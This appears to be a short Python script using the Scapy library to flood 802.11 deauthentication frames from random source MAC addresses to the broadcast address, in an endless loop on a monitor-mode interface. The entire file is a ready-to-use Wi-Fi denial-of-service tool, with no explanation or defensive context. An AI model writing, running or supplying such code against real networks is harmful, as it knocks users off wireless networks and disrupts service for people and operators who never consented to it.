#!/usr/bin/python3
import sys
from scapy.all import *

brdmac =  "ff:ff:ff:ff:ff:ff"
def deauth():
    while(True):
        src=RandMAC()
        pkt = RadioTap() / Dot11( addr1 = brdmac, addr2 = src, addr3 =src)/ Dot11Deauth()
        sendp(pkt, iface = "mon0", count = 5, inter = .2)

